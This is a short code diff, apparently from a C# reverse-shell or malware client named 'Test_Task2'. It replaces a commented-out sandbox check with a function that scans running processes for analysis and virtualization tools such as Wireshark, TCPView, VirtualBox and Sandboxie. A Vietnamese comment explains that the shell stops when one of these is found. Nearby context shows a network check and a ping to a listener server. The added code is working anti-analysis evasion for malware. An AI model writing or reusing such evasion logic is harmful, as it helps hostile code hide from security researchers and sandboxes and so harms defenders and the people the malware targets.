@@ -110,6 +110,7 @@ namespace Test_Task2
         {
             return NetworkInterface.GetIsNetworkAvailable();
         }
+        /*
         private static bool IsRunningInSandbox()
         {
             // Check name
@@ -119,7 +120,22 @@ namespace Test_Task2
                 return true;
             }
             return false; // Not detect sandbox
+        } */
+// Check tiến trình nếu phát hiện có những tên được liệt kê sẽ ngừng shell
+                private static bool IsRunningInSandbox()
+        {
+            // Một số phần mềm sandbox thường có tên gọi cụ thể trong tiến trình
+            string[] sandboxProcesses = { "vmsrvc", "tcpview", "wireshark", "virtualbox", "sandboxie", "sbiectrl" };
+            foreach (string process in sandboxProcesses)
+            {
+                if (Process.GetProcessesByName(process).Length > 0)
+                {
+                    return true;
+                }
+            }
+            return false;
         }
+        
         // Ping server listener
         static bool PingServer(string ipAddress)
         {
